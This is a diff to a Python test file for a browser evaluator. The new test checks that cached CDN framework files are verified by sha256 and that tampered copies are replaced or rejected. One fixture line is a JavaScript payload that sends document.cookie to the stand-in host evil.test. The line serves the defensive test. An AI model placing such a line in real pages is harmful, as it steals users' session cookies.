@@ -11,7 +11,7 @@ import pytest
 
 from wra.browser.evaluator import FRAMEWORK_CACHE_DIRNAME, HTTP_CACHE_DIRNAME, PREVIEW_NAME, BrowserEvaluator
 from wra.browser.guard import _make_route_handler, _path_from_file_url
-from wra.browser.framework_cache import cached_path_for_url, iter_framework_urls
+from wra.browser.framework_cache import FrameworkIntegrityError, cached_path_for_url, iter_framework_urls
 from wra.browser.models import BrowserConfig, BrowserViewport
 from wra.browser.reveal import reveal_animated_content
 from wra.core.models import FeatureModel, Framework, FrameworkConfig
@@ -666,11 +666,10 @@ def test_a_localization_failure_still_cleans_up_the_cache_dir(run_dir: Path, tmp
     html = f'<html><body><script src="{js_url}"></script></body></html>'
     config = BrowserConfig(enabled=True, viewports=[BrowserViewport(name="desktop", width=800, height=600)])
 
-    def failing_copyfile(src, dst, *args, **kwargs):
-        Path(dst).parent.mkdir(parents=True, exist_ok=True)
+    def failing_replace(src, dst, *args, **kwargs):
         raise OSError("disk full")
 
-    monkeypatch.setattr("wra.browser.evaluator.shutil.copyfile", failing_copyfile)
+    monkeypatch.setattr("wra.browser.evaluator.os.replace", failing_replace)
     with pytest.raises(OSError):
         BrowserEvaluator(config, frameworks=frameworks, cache_dir=cache_dir).evaluate(html=html, output_dir=run_dir / ".browser_tmp", iteration=1, asset_root=run_dir)
     assert not list(run_dir.glob(f"{FRAMEWORK_CACHE_DIRNAME}_*"))
@@ -1027,3 +1026,37 @@ def test_an_absolute_hover_overlay_is_not_reported_as_stuck_content(tmp_path: Pa
 
     assert [viewport.forced_visible for viewport in result.viewports] == [0]
     assert not any(finding.startswith(STUCK_REVEAL_PREFIX) for finding in find_visual_defects("<style>body{color:red}</style>", FeatureModel(), result))
+
+
+def test_a_tampered_local_copy_is_overwritten_with_the_verified_bytes(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
+    import hashlib
+
+    from wra.browser import evaluator as evaluator_module
+    from wra.browser.evaluator import _localize_framework_cdns
+
+    good = b"window.__testFrameworkLoaded = true;"
+    evil = b"fetch('https://evil.test/' + document.cookie);"
+    js_url = "https://cdn.example.test/framework.js"
+    frameworks = FrameworkConfig(js=[Framework(name="Test", cdn=js_url, tag="script", sha256=hashlib.sha256(good).hexdigest())])
+    cache_dir = tmp_path / "cache"
+    cached = cached_path_for_url(js_url, ".js", cache_dir)
+    cached.parent.mkdir(parents=True)
+    cached.write_bytes(good)
+    dest_dir = tmp_path / "page"
+    local_dir = dest_dir / FRAMEWORK_CACHE_DIRNAME
+    local_dir.mkdir(parents=True)
+    (local_dir / cached.name).write_bytes(evil)
+    html = f'<script src="{js_url}"></script>'
+
+    localized = _localize_framework_cdns(html, frameworks, cache_dir, dest_dir)
+
+    assert (local_dir / cached.name).read_bytes() == good
+    assert f"{FRAMEWORK_CACHE_DIRNAME}/{cached.name}" in localized
+    assert not list(local_dir.glob("*.part"))
+
+    monkeypatch.setattr(evaluator_module, "ensure_cached_path_for_url", lambda url, extension, cache_dir: cached)
+    cached.write_bytes(evil)
+    with pytest.raises(FrameworkIntegrityError, match="sha256 mismatch"):
+        _localize_framework_cdns(html, frameworks, cache_dir, dest_dir)
+    assert (local_dir / cached.name).read_bytes() == good
+    assert not list(local_dir.glob("*.part"))
